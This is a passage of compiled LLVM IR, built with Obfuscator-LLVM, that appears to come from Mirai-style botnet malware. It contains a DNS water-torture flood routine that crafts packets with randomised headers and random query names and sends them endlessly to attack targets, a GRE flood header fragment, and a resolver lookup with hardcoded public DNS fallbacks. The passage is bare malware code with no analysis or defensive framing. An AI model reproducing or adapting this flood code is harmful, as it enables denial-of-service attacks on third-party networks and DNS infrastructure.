  %242 = add nsw i32 %241, 1
  store i32 %242, i32* %23, align 4
  br label %214

; <label>:243:                                    ; preds = %214
  %244 = load i8, i8* %24, align 1
  %245 = load i8*, i8** %30, align 8
  store i8 %244, i8* %245, align 1
  %246 = load i8*, i8** %29, align 8
  %247 = load i32, i32* %21, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds i8, i8* %246, i64 %248
  %250 = getelementptr inbounds i8, i8* %249, i64 2
  %251 = bitcast i8* %250 to %struct.grehdr*
  store %struct.grehdr* %251, %struct.grehdr** %31, align 8
  %252 = call zeroext i16 @htons(i16 zeroext 1) #7
  %253 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %254 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  %255 = call zeroext i16 @htons(i16 zeroext 1) #7
  %256 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %257 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %256, i32 0, i32 1
  store i16 %255, i16* %257, align 2
  br label %258

; <label>:258:                                    ; preds = %243
  %259 = load i32, i32* %9, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  br label %97

; <label>:261:                                    ; preds = %97
  br label %262

; <label>:262:                                    ; preds = %398, %261
  store i32 0, i32* %9, align 4
  br label %263

; <label>:263:                                    ; preds = %395, %262
  %264 = load i32, i32* %9, align 4
  %265 = load i8, i8* %5, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp slt i32 %264, %266
  br i1 %267, label %268, label %398

; <label>:268:                                    ; preds = %263
  %269 = bitcast [256 x i8*]* %32 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %269, i8* bitcast ([256 x i8*]* @attack_udp_dns.dns_array to i8*), i64 2048, i32 16, i1 false)
  %270 = call i32 @rand() #6
  %271 = srem i32 %270, 256
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds [256 x i8*], [256 x i8*]* %32, i64 0, i64 %272
  %274 = load i8*, i8** %273, align 8
  store i8* %274, i8** %33, align 8
  %275 = load i8*, i8** %33, align 8
  %276 = bitcast i8* %275 to %struct.iphdr*
  store %struct.iphdr* %276, %struct.iphdr** %34, align 8
  %277 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i64 1
  %279 = bitcast %struct.iphdr* %278 to %struct.udphdr*
  store %struct.udphdr* %279, %struct.udphdr** %35, align 8
  %280 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %281 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %280, i64 1
  %282 = bitcast %struct.udphdr* %281 to %struct.dnshdr*
  store %struct.dnshdr* %282, %struct.dnshdr** %36, align 8
  %283 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %284 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %283, i64 1
  %285 = bitcast %struct.dnshdr* %284 to i8*
  %286 = getelementptr inbounds i8, i8* %285, i64 1
  store i8* %286, i8** %37, align 8
  %287 = load i16, i16* %13, align 2
  %288 = zext i16 %287 to i32
  %289 = icmp eq i32 %288, 65535
  br i1 %289, label %290, label %296

; <label>:290:                                    ; preds = %268
  %291 = call i32 @rand_next()
  %292 = and i32 %291, 65535
  %293 = trunc i32 %292 to i16
  %294 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 4
  br label %296

; <label>:296:                                    ; preds = %290, %268
  %297 = load i16, i16* %16, align 2
  %298 = zext i16 %297 to i32
  %299 = icmp eq i32 %298, 65535
  br i1 %299, label %300, label %306

; <label>:300:                                    ; preds = %296
  %301 = call i32 @rand_next()
  %302 = and i32 %301, 65535
  %303 = trunc i32 %302 to i16
  %304 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %305 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %304, i32 0, i32 0
  store i16 %303, i16* %305, align 2
  br label %306

; <label>:306:                                    ; preds = %300, %296
  %307 = load i16, i16* %17, align 2
  %308 = zext i16 %307 to i32
  %309 = icmp eq i32 %308, 65535
  br i1 %309, label %310, label %316

; <label>:310:                                    ; preds = %306
  %311 = call i32 @rand_next()
  %312 = and i32 %311, 65535
  %313 = trunc i32 %312 to i16
  %314 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 1
  store i16 %313, i16* %315, align 2
  br label %316

; <label>:316:                                    ; preds = %310, %306
  %317 = load i16, i16* %18, align 2
  %318 = zext i16 %317 to i32
  %319 = icmp eq i32 %318, 65535
  br i1 %319, label %320, label %326

; <label>:320:                                    ; preds = %316
  %321 = call i32 @rand_next()
  %322 = and i32 %321, 65535
  %323 = trunc i32 %322 to i16
  %324 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %325 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  br label %326

; <label>:326:                                    ; preds = %320, %316
  %327 = load i8*, i8** %37, align 8
  %328 = load i8, i8* %19, align 1
  %329 = zext i8 %328 to i32
  %330 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %327, i32 %329)
  %331 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 7
  store i16 0, i16* %332, align 2
  %333 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %334 = bitcast %struct.iphdr* %333 to i16*
  %335 = call zeroext i16 @checksum_generic(i16* %334, i32 20)
  %336 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 7
  store i16 %335, i16* %337, align 2
  %338 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 3
  store i16 0, i16* %339, align 2
  %340 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %341 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %342 = bitcast %struct.udphdr* %341 to i8*
  %343 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %344 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %343, i32 0, i32 2
  %345 = load i16, i16* %344, align 2
  %346 = load i8, i8* %19, align 1
  %347 = zext i8 %346 to i64
  %348 = add i64 21, %347
  %349 = add i64 %348, 2
  %350 = load i32, i32* %21, align 4
  %351 = sext i32 %350 to i64
  %352 = add i64 %349, %351
  %353 = add i64 %352, 4
  %354 = trunc i64 %353 to i32
  %355 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %340, i8* %342, i16 zeroext %345, i32 %354)
  %356 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 3
  store i16 %355, i16* %357, align 2
  %358 = load i32, i32* %22, align 4
  %359 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %360 = load i32, i32* %9, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 0
  %364 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %363, i32 0, i32 2
  %365 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %364, i32 0, i32 0
  store i32 %358, i32* %365, align 4
  %366 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %367 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %366, i32 0, i32 1
  %368 = load i16, i16* %367, align 2
  %369 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %370 = load i32, i32* %9, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i64 %371
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %372, i32 0, i32 0
  %374 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %373, i32 0, i32 1
  store i16 %368, i16* %374, align 2
  %375 = load i32, i32* %10, align 4
  %376 = load i8*, i8** %33, align 8
  %377 = load i8, i8* %19, align 1
  %378 = zext i8 %377 to i64
  %379 = add i64 41, %378
  %380 = add i64 %379, 2
  %381 = load i32, i32* %21, align 4
  %382 = sext i32 %381 to i64
  %383 = add i64 %380, %382
  %384 = add i64 %383, 4
  %385 = bitcast %union.__CONST_SOCKADDR_ARG* %38 to %struct.sockaddr**
  %386 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %387 = load i32, i32* %9, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i64 %388
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i32 0, i32 0
  %391 = bitcast %struct.sockaddr_in* %390 to %struct.sockaddr*
  store %struct.sockaddr* %391, %struct.sockaddr** %385, align 8
  %392 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %38, i32 0, i32 0
  %393 = load %struct.sockaddr*, %struct.sockaddr** %392, align 8
  %394 = call i64 @sendto(i32 %375, i8* %376, i64 %384, i32 16384, %struct.sockaddr* %393, i32 16)
  br label %395

; <label>:395:                                    ; preds = %326
  %396 = load i32, i32* %9, align 4
  %397 = add nsw i32 %396, 1
  store i32 %397, i32* %9, align 4
  br label %263

; <label>:398:                                    ; preds = %263
  br label %262

; <label>:399:                                    ; preds = %93, %87, %81
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 46)
  %11 = call i8* @table_retrieve_val(i32 46, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 46)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %95

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 47)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 47, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 47)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %94

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %84, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %87

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %84

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %69, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %69, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub nsw i32 %66, 1
  %68 = icmp eq i32 %65, %67
  br i1 %68, label %69, label %83

; <label>:69:                                     ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* %70, i8* %74, i32 %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

; <label>:83:                                     ; preds = %64
  br label %84

; <label>:84:                                     ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30

; <label>:87:                                     ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %87
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %92 = call i32 @inet_addr(i8* %91) #6
  store i32 %92, i32* %1, align 4
  br label %106

; <label>:93:                                     ; preds = %87
  br label %94

; <label>:94:                                     ; preds = %93, %15
  br label %95

; <label>:95:                                     ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

; <label>:98:                                     ; preds = %95
  %99 = call i32 @htonl(i32 134744072) #7
  store i32 %99, i32* %1, align 4
  br label %106

; <label>:100:                                    ; preds = %95
  %101 = call i32 @htonl(i32 1246898730) #7
  store i32 %101, i32* %1, align 4
  br label %106

; <label>:102:                                    ; preds = %95
  %103 = call i32 @htonl(i32 1074151430) #7
  store i32 %103, i32* %1, align 4
  br label %106

; <label>:104:                                    ; preds = %95
  %105 = call i32 @htonl(i32 67240450) #7
  store i32 %105, i32* %1, align 4
  br label %106

; <label>:106:                                    ; preds = %104, %102, %100, %98, %95, %90
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @rand_alphastr(...) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846634}
!2 = !{i32 -2146846225}
